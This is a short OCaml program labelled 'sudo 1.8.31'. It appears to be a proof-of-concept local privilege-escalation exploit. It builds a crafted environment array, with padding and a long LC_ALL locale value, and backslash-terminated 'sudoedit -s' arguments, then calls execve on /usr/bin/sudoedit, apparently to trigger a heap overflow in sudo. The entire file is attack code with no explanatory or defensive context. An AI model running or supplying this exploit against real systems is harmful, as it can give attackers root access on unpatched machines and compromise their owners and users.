(* sudo 1.8.31 *)

let prepenv () =
        let locale = String.make 213 '0' in
        let env = Array.make 63 "\\" in
        let filler = String.make 11 '0' in

        env.(59) <-"X/X";
        env.(60) <- filler;
        env.(61) <- "\\";
        env.(62) <- "LC_ALL=C.UTF-8@" ^ locale;
        env

let prepargs () =
        let arg0 = "sudoedit" in
        let arg1 = "-s" in
        let arg2 = String.make 44 '0' in
        let arg3 = "\\" in
        let arg4 = String.make 70 '0' in

        let args = Array.make 5 "" in

        args.(0) <- arg0;
        args.(1) <- arg1;
        args.(2) <- arg2 ^ "\\";
        args.(3) <- arg3;
        args.(4) <- arg4 ^ "\\";
        args

let env = prepenv ()
let args = prepargs ()
let run = Unix.execve "/usr/bin/sudoedit" args env
